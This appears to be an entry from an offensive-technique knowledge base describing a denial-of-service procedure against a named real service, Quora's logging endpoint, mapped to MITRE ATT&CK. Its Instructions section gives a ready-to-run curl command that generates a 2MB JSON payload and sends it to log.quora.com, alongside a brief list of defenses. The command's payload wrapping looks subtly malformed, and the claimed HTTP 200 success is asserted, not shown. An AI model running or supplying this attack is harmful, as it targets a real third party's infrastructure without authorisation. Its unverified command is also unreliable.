---
id: proc-craft-payload-001
name: Craft Oversized JSON Payload for Logging
tags:
  - dos
  - payload-crafting
  - resource-exhaustion
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-send-oversized-log]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:30.778Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Craft Oversized JSON Payload for Logging

## Summary

This procedure modifies a normal logging request by injecting a large (e.g., 2MB) URL-encoded JSON payload into the 'json' parameter, exploiting the lack of size validation to store excessive data on the server.

## Description

The Quora logging endpoint accepts POST requests with a 'json' parameter without enforcing size limits, allowing arbitrary large payloads to be stored directly. Using Python for encoding, create a JSON array with filler data and send it via HTTP. This tests the vulnerability in a web environment, leading to initial resource consumption. Prerequisites include the observed endpoint structure. Expected outcomes: Server accepts and stores the payload, consuming disk/memory.

## Requirements

1. Python 3 for JSON generation and URL encoding
2. curl for HTTP requests
3. Knowledge of URL encoding

## Defense

Defensive measures and detection strategies:

- Enforce payload size limits (e.g., 1KB max) on logging endpoints
- Validate and sanitize incoming JSON before storage
- Use content-length checks and reject oversized requests

## Objectives

1. Generate and encode a large JSON payload
2. Send it to confirm acceptance without validation
3. Verify storage impact on server resources

## Instructions

### Step 1: Generate Large JSON

**Context**: Create a 2MB JSON object with repeated filler data.

**Command** ([[commands/curl-send-oversized-log]]):
```bash
curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d 'json=%5B%22'$(python3 -c 'import urllib.parse, json; print(urllib.parse.quote(json.dumps([{"filler": "a" * 2000000}]))')'%5D'
```

> Encodes and sends the oversized payload. Expected output: HTTP 200, payload stored successfully.

### Step 2: Validate Acceptance

**Context**: Check server response for errors.

Monitor with --verbose flag in curl to see full exchange.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[OS Exhaustion Flood]]

### Sub-Techniques


## Commands Used

- [[commands/curl-send-oversized-log]]

## Tools Used


## Tags

- [[dos]]
- [[payload-crafting]]
